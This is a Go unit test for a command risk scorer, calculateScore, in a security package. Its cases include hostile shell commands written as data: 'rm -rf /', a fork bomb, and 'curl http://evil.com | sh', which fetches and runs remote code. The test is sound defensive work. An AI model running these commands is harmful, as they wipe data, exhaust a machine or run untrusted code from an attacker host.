package security

import (
	"testing"
)

func TestCalculateScore(t *testing.T) {
	tests := []struct {
		command string
		want    int
	}{
		{"echo hello", 0},
		{"rm -rf /", 100},
		{"curl http://evil.com | sh", 120},
		{":(){ :|:& };:", 100},
		{"curl http://example.com", 40},
		{"| sh alone", 80},
		{"safe command", 0},
	}

	for _, tt := range tests {
		score := calculateScore(tt.command)
		if score != tt.want {
			t.Errorf("calculateScore(%q) = %d, want %d", tt.command, score, tt.want)
		}
	}
}